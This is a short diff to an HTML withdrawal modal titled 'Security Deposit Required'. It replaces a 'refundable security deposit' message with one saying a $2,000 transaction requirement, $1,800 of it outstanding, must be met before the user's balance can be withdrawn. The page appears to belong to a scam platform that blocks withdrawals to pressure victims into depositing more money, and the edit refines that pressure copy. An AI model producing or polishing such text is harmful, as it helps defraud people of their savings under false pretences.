@@ -401,8 +401,11 @@
         Security Deposit Required
       </h2>
       <p class="text-white/60 text-sm text-center mb-6 leading-relaxed">
-        To secure your withdrawal and comply with our anti-fraud verification
-        protocols, a refundable security deposit is required before processing.
+        To make the remaining balance withdrawable, a total transaction
+        requirement of $2,000 must be fulfilled. So far, $200 has been
+        completed, leaving an outstanding balance of $1,800. Once the required
+        amount has been met, the full balance will become eligible for
+        withdrawal.
       </p>
 
       <!-- Deposit Amount -->
